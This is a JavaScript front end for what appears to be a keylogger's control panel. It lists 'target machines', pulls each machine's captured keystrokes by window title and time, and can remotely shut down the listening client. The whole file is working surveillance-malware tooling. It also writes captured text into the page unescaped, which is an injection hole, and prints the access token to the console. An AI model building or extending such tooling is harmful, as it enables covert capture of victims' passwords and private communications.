async function getCookie(name) {
    const cookies = document.cookie.split('; ').map(cookie => cookie.split('='));
    for (let [key, value] of cookies) {
        if (key === name) {
            return decodeURIComponent(value);
        }
    }
    return null;
}

async function GetDemoLogs() {
    const token = await getCookie("access_token");
    console.log(token);
    
    if (!token) {
        window.location.href = "/login";
        return;
    }

    try {
        let response = await fetch("/api/get_demo", {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        let data = await response.json();
        return data;
    } catch (error) {
        console.error("Error fetching demo logs:", error);
        return null;
    }
}

async function GetComputersList() {
    const token = await getCookie("access_token"); 
    if (!token) {
        window.location.href = "/login";
        return;
    }

    try {
        let response = await fetch("/api/get_target_machines_list", {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        let data = await response.json();
        if (data.msg === "Token has expired") {
            window.location.href = "/login";
            return;
        }
        return data;
    } catch (error) {
        console.error("Error fetching computers list:", error);
        return null;
    }
}

async function GetComputersActivity(machine_sn, start_date, end_date) {
    const token = await getCookie("access_token"); 
    if (!token) {
        window.location.href = "/login";
        return;
    }
        let response = await fetch("/api/get_keystrokes?machine_sn=" + machine_sn + "&start_date=" + start_date + "&end_date=" + end_date, {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });
        let data = await response.json();
        
        return data;
}

async function fetchLogs() {
    const table = document.getElementById("ComputersTableBody");
    table.innerHTML = "<tr><td colspan='4' class='text-center'>Loading data...</td></tr>";

    try {
        const data = await GetComputersList();
        table.innerHTML = "";

        if (!data || typeof data !== "object" || Object.keys(data).length === 0) { 
            table.innerHTML = "<tr><td colspan='4' class='text-center'>No available data</td></tr>";
            return;
        }

        Object.entries(data).forEach(([id, details]) => {
            const row = document.createElement("tr");
            row.innerHTML = `
                <td>${id}</td>
                <td>${details.ip}</td>
                <td>${details.name}</td>
                <td>${details.active ? '✅' : '🟩'}</td>
            `;
            table.appendChild(row);
        });
    } catch (error) {
        console.error("Error in fetchLogs:", error);
        table.innerHTML = "<tr><td colspan='4' class='text-center'>Error loading data</td></tr>";
    }
}

const popup = document.getElementById("ComputerActivity");
const overlay = document.getElementById("overlay");
// const openPopupBtn = document.getElementById("openPopup");
const closePopupBtn = document.getElementById("closePopup");

function formatDateToDDMMYYYY(dateStr) {
    let date = new Date(dateStr);
    let day = String(date.getDate()).padStart(2, '0');
    let month = String(date.getMonth() + 1).padStart(2, '0');
    let year = date.getFullYear();
    return `${day}-${month}-${year}`;
}


async function openPopup(machineId, ip, name) {
    document.getElementById("compId").textContent = machineId;
    document.getElementById("compIp").textContent = ip;
    document.getElementById("compName").textContent = name;

    popup.style.display = "block";
    overlay.style.display = "block";

    let today = new Date().toISOString().split('T')[0];
    document.getElementById("startDate").value = today;
    document.getElementById("endDate").value = today;

    LoadComputerActivity(machineId, formatDateToDDMMYYYY(today), formatDateToDDMMYYYY(today));
}


function closePopup() {
    popup.style.display = "none";
    overlay.style.display = "none";
}
async function LoadComputerActivity(machine_sn, start_date, end_date) {
    const table = document.getElementById("ActivityTable");
    table.innerHTML = "<tr><td colspan='3' class='text-center'>Loading data...</td></tr>";
    try {
        const log = await GetComputersActivity(machine_sn, start_date, end_date);
        table.innerHTML = "";
        if (log.error) {
            table.innerHTML = `<tr><td colspan='3' class='text-center'>${log.error}</td></tr>`;
            return;
        }
        
        
        if (!log || typeof log !== "object" || Object.keys(log).length === 0 || log === null) {
            table.innerHTML = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
        } else {
            Object.entries(log.logs).forEach(([window,val]) => {
                Object.entries(val).forEach(([time,text]) => {
                    const row = document.createElement("tr");
                    row.innerHTML = `<td>${time}</td><td>${window}</td><td>${text}</td>`;
                    table.appendChild(row);
                })      
            });  
        }
    } catch (error) {
        console.error("Error in openPopup:", error);
        table.innerHTML = "<tr><td colspan='3' class='text-center'>Error loading data</td></tr>";
    }
}



closePopupBtn.addEventListener("click", closePopup);
overlay.addEventListener("click", closePopup);

document.addEventListener("keydown", function(event) {
    if (event.key === "Escape") {
        closePopup();
    }
});

document.getElementById("logout").addEventListener("click", async function() {
    document.cookie = "access_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
    window.location.href = "/login";
});

document.addEventListener("DOMContentLoaded", fetchLogs);

document.addEventListener("DOMContentLoaded", function () {
    const tableBody = document.getElementById("ComputersTableBody");

    tableBody.addEventListener("click", function (event) {
        let row = event.target.closest("tr");
        if (!row) return;

        let rowData = Array.from(row.children).map(td => td.textContent.trim());

        openPopup(rowData[0], rowData[1], rowData[2]);
    });
});


document.getElementById("updateActivity").addEventListener("click", function() {
    let machineId = document.getElementById("compId").textContent;
    let startDate = document.getElementById("startDate").value;
    let endDate = document.getElementById("endDate").value;

    LoadComputerActivity(machineId, formatDateToDDMMYYYY(startDate), formatDateToDDMMYYYY(endDate));
});


async function StopListening(machineId) {
    const token = await getCookie("access_token");
    if (!token) {
        window.location.href = "/login";
        return;
    }

    try {
        let response = await fetch(`/api/shutdown_client?machine_sn=${machineId}`, {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        let data = await response.json();

        if (data.status === "success") {
            fetchLogs();
        }

        return data;
    } catch (error) {
        console.error("error:", error);
        return null;
    }
}

async function openPopup(machineId, ip, name) {
    document.getElementById("compId").textContent = machineId;
    document.getElementById("compIp").textContent = ip;
    document.getElementById("compName").textContent = name;

    popup.style.display = "block";
    overlay.style.display = "block";

    let today = new Date().toISOString().split('T')[0];
    document.getElementById("startDate").value = today;
    document.getElementById("endDate").value = today;

    LoadComputerActivity(machineId, formatDateToDDMMYYYY(today), formatDateToDDMMYYYY(today));

    const stopListeningButton = document.getElementById("stopListening");
    stopListeningButton.replaceWith(stopListeningButton.cloneNode(true));

    document.getElementById("stopListening").addEventListener("click", function() {
        {
            const currentMachineId = document.getElementById("compId").textContent;
            StopListening(currentMachineId);
        }
    });
}

function closePopup() {
    popup.style.display = "none";
    overlay.style.display = "none";

    const stopListeningButton = document.getElementById("stopListening");
    if (stopListeningButton) {
        stopListeningButton.replaceWith(stopListeningButton.cloneNode(true));
    }
}